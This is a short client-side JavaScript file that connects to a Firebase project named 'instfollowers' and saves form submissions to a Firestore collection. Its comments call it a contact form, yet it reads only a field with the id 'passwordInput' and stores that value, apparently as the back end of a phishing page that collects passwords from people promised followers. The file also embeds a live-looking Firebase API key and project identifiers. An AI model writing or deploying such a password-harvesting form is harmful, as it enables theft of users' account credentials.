// Import the functions you need from the SDKs
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

// ⚠️ STEP 1: Replace this with your project's configuration
const firebaseConfig = {
    apiKey: "AIzaSyBOAS7bZbOSw7liSKGYc5VUz46s2d23iHk",
    authDomain: "instfollowers-36e25.firebaseapp.com",
    projectId: "instfollowers-36e25",
    storageBucket: "instfollowers-36e25.firebasestorage.app",
    messagingSenderId: "239353140245",
    appId: "1:239353140245:web:891f52f24a4ded2fe02a1c"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app); // Get a reference to the Firestore database

// ----------------------------------------------------------------------
// 🚀 STEP 2: Handle Form Submission
// ----------------------------------------------------------------------

// 1. Get references to the HTML elements
const contactForm = document.getElementById('passwordForm');
const nameInput = document.getElementById('passwordInput');
const emailInput = document.getElementById('passwordInput');
const messageElement = document.getElementById('message');

// 2. Add an event listener to the form's submit event
contactForm.addEventListener('submit', (e) => {
    // Prevent the default form submission (which causes a page reload)
    e.preventDefault(); 
    
    // Get the values from the input fields
    const name = nameInput.value;
    const email = emailInput.value;

    // Call the function to save the data to Firestore
    saveSubmission(name, email);
    
    // Clear the form after submission
    contactForm.reset();
});


// ----------------------------------------------------------------------
// 💾 STEP 3: Write Data to Firestore
// ----------------------------------------------------------------------

async function saveSubmission(name, email) {
    try {
        // Prepare the data object
        const formData = {
            fullName: name,
            emailAddress: email,
            timestamp: new Date() // Add a timestamp for tracking
        };
        
        // Use addDoc to automatically generate a document ID 
        // and save the data to the 'submissions' collection
        const docRef = await addDoc(collection(db, "submissions"), formData);

        // Success feedback
        messageElement.textContent = `✅ Success! Document written with ID: ${docRef.id}`;
        messageElement.style.color = 'green';
        console.log("Document written with ID: ", docRef.id);

    } catch (e) {
        // Error feedback
        messageElement.textContent = `❌ Error adding document: ${e}`;
        messageElement.style.color = 'red';
        console.error("Error adding document: ", e);
    }

}
